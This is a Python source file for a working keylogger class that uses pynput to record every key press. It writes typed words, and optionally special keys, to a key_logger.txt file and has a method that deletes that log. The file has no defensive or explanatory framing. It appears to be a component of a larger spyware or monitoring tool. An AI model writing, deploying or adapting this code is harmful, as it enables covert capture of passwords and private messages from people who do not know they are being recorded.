from os import remove, path
from threading import Thread

from pynput.keyboard import Listener, Key


class KeyboardLogger(Thread):

    def __init__(self, storage_path: str, storage_folder: str, special_keys: bool):
        Thread.__init__(self, name="keyboard")

        self.keys = []
        self.special_keys = special_keys

        self.storage_path = storage_path
        self.storage_folder = storage_folder

    def __on_press(self, key):

        if key == Key.space:

            self.__log_word()
            self.keys.clear()

        else:

            current_key = str(key)

            if 'Key' in current_key:

                if self.special_keys is True:

                    self.keys.append(f"[{current_key[4:].upper()}]")

            else:

                self.keys.append(current_key)

    def __log_word(self):

        with open(f'{self.storage_path}{self.storage_folder}key_logger.txt', 'a', encoding='utf-8') as self.key_logger:
            self.key_logger.write(''.join(current_key for current_key in self.keys).replace("'", "") + "\n")

    def clear(self):

        if path.exists(f'{self.storage_path}{self.storage_folder}key_logger.txt'):

            try:

                self.key_logger.close()

            except:

                pass

            remove(f'{self.storage_path}{self.storage_folder}key_logger.txt')
            self.keys.clear()

    def run(self):

        with Listener(on_press=self.__on_press) as listener:
            listener.join()
